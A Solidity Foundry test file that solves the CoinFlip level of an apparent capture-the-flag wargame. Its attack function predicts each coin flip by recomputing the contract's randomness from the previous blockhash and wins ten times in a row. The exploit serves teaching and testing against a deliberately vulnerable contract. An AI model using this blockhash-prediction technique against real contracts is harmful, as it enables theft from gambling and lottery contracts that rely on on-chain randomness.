// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "@core/Tests.sol";
import {CoinFlipFactory, CoinFlip} from "../levels/03_CoinFlip/CoinFlipFactory.sol";

contract TestCoinFlip is Tests {
    CoinFlip private level;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new CoinFlipFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = CoinFlip(levelAddress);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        // Ensures normal operation of the CoinFlip contract
        vm.roll(2);

        while (level.consecutiveWins() < 10) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            level.flip(side);
            vm.roll(block.number + 1);
        }

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
